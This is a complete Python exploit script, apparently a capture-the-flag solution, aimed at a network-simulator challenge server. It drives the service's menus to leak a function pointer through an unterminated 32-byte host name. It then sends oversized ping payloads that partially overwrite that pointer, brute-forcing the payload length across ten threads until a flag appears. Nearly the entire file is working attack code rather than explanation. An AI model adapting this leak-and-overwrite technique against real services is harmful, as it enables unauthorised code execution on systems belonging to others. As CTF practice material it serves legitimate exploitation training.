import socket, time, re, struct, sys, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "pt2.ctf.pascalctf.it"
PORT = 9005

M_CREATE_HOST   = 1
M_CREATE_ROUTER = 2
M_CONNECT_IF    = 3
M_ASSIGN_IP     = 12
M_SHOW_NET      = 15
M_SIM_MENU      = 16

S_PING     = 1
S_READLOGS = 2
S_BACK     = 3

FLAG_RE = re.compile(rb"(pascalCTF\{[^}]+\}|pctf\{[^}]+\}|flag\{[^}]+\})", re.I)

def p64(x): return struct.pack("<Q", x)

class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port))
        self.s.settimeout(0.6)
        self.buf = b""

    def close(self):
        try: self.s.close()
        except: pass

    def send(self, b: bytes):
        self.s.sendall(b)

    def sendline(self, b: bytes):
        self.send(b + b"\n")

    def recv_some(self) -> bytes:
        try:
            return self.s.recv(65536)
        except socket.timeout:
            return b""

    def recv_until_any(self, needles, timeout=10.0) -> bytes:
        needles = [n.lower() for n in needles]
        end = time.time() + timeout
        while time.time() < end:
            low = self.buf.lower()
            if any(n in low for n in needles):
                break
            chunk = self.recv_some()
            if chunk:
                self.buf += chunk
        out = self.buf
        self.buf = b""
        return out

def wait_choice(io: Tube):
    io.recv_until_any([b"enter your choice", b"choice:", b">"], timeout=12.0)

def menu(io: Tube, n: int):
    wait_choice(io)
    io.sendline(str(n).encode())

def expect(io: Tube, words, timeout=10.0):
    io.recv_until_any(words, timeout=timeout)

def create_host(io: Tube, idx: int, raw_name: bytes, exact32_no_nl: bool):
    menu(io, M_CREATE_HOST)
    expect(io, [b"enter host index"])
    io.sendline(str(idx).encode())
    expect(io, [b"enter host name"])
    if exact32_no_nl:
        if len(raw_name) != 32:
            raise ValueError("need exactly 32 bytes")
        io.send(raw_name)
    else:
        io.sendline(raw_name)

def create_router(io: Tube, idx: int, name: bytes):
    menu(io, M_CREATE_ROUTER)
    expect(io, [b"enter router index"])
    io.sendline(str(idx).encode())
    expect(io, [b"enter router name"])
    io.sendline(name)

def connect_router_eth0_to_host(io: Tube, r_idx: int, if_idx: int, h_idx: int):
    menu(io, M_CONNECT_IF)
    expect(io, [b"enter router index"])
    io.sendline(str(r_idx).encode())
    expect(io, [b"enter interface index"])
    io.sendline(str(if_idx).encode())
    expect(io, [b"host [1]", b"router [2]"])
    io.sendline(b"1")
    expect(io, [b"host index"])
    io.sendline(str(h_idx).encode())

def assign_ip_router(io: Tube, r_idx: int, if_idx: int,
                     ip4=(9,9,9,9), mask4=(255,255,255,255)):
    menu(io, M_ASSIGN_IP)
    expect(io, [b"host [2]", b"router [1]"])
    io.sendline(b"1")
    expect(io, [b"enter router index"])
    io.sendline(str(r_idx).encode())
    expect(io, [b"enter interface index"])
    io.sendline(str(if_idx).encode())
    expect(io, [b"enter ip"])
    io.sendline(("%d %d %d %d" % ip4).encode())
    expect(io, [b"netmask"])
    io.sendline(("%d %d %d %d" % mask4).encode())

def show_network(io: Tube) -> bytes:
    menu(io, M_SHOW_NET)
    return io.recv_until_any([b"enter your choice", b"choice:", b">"])

def enter_sim(io: Tube):
    menu(io, M_SIM_MENU)
    wait_choice(io)

def sim_ping(io: Tube, host_idx: int, dst_ip=(9,9,9,9), payload: bytes=b"X"):
    io.sendline(str(S_PING).encode())
    expect(io, [b"host index"])
    io.sendline(str(host_idx).encode())
    expect(io, [b"enter ip"])
    io.sendline(("%d %d %d %d" % dst_ip).encode())
    expect(io, [b"enter data"])
    io.send(payload + b"\n")
    wait_choice(io)

def sim_read_logs(io: Tube) -> bytes:
    io.sendline(str(S_READLOGS).encode())
    return io.recv_until_any([b"enter your choice", b"choice:", b">"])

def sim_back(io: Tube):
    io.sendline(str(S_BACK).encode())
    wait_choice(io)

def leak_win_host(io: Tube) -> int:
    create_host(io, 0, b"A"*32, True)
    out = show_network(io)
    marker = b"[0] " + b"A"*32
    pos = out.find(marker)
    if pos < 0:
        raise RuntimeError("leak failed")
    start = pos + len(marker)
    end = out.find(b" (running)", start)
    leak = out[start:end][:8].ljust(8, b"\x00")
    return struct.unpack("<Q", leak)[0]

def attempt_once(payload_len: int):
    io = Tube(HOST, PORT)
    try:
        wait_choice(io)
        win_host = leak_win_host(io)
        ptr6 = p64(win_host)[:6]
        if b"\n" in ptr6 or b"\x00" in ptr6:
            return False, b"bad ptr"

        create_host(io, 1, b"H", False)
        create_router(io, 0, b"R0")
        connect_router_eth0_to_host(io, 0, 0, 1)
        assign_ip_router(io, 0, 0)

        enter_sim(io)
        sim_ping(io, 1, payload=b"hi")
        time.sleep(1)
        sim_read_logs(io)
        sim_back(io)

        create_router(io, 1, b"R1")
        connect_router_eth0_to_host(io, 1, 0, 1)

        payload = b"D"*(payload_len-6) + ptr6
        enter_sim(io)
        sim_ping(io, 1, payload=payload)
        time.sleep(0.7)

        out = io.recv_until_any([b">"], timeout=2)
        m = FLAG_RE.search(out)
        if m:
            return True, m.group(0)

        return False, b""
    finally:
        io.close()

def worker(L, stop_event):
    if stop_event.is_set():
        return None
    print(f"[*] trying {L}")
    ok, out = attempt_once(L)
    if ok:
        stop_event.set()
        return L, out
    return None

def main():
    start = 420
    end = 650
    threads = 10

    if len(sys.argv) > 1: start = int(sys.argv[1])
    if len(sys.argv) > 2: end = int(sys.argv[2])
    if len(sys.argv) > 3: threads = int(sys.argv[3])

    stop_event = threading.Event()

    with ThreadPoolExecutor(max_workers=threads) as exe:
        futures = [exe.submit(worker, L, stop_event)
                   for L in range(start, end+1)]
        for f in as_completed(futures):
            res = f.result()
            if res:
                L, flag = res
                print("\n=== FLAG FOUND ===")
                print(f"payload_len = {L}")
                print(flag.decode(errors="replace"))
                return

    print("[!] no success, widen range")

if __name__ == "__main__":
    main()